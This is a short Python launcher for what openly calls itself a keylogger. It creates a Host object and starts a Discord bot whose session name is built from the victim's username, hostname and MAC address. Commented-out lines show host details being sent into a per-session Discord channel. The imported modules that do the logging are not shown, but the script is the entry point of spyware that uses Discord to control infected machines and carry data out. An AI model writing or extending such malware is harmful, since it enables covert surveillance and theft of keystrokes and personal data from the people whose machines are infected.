from classes.Host import Host
from discord_util.discord import run_bot

if __name__ == '__main__':
    # print("Key logger started")
    # start_time = now()
    #
    host = Host()

    # discord.login()
    # discord.create_channel("session-" + str(host.hostname) + "-" + str(convert_date_to_date_format(start_time)))
    # discord.send_message(host)

    # log()

    run_bot(
        str(host.username).lower() + "_" + str(host.hostname).lower() + "_" + str(host.mac).replace(":", "-"),
        host,
        "hello")
    print("Key logger started")
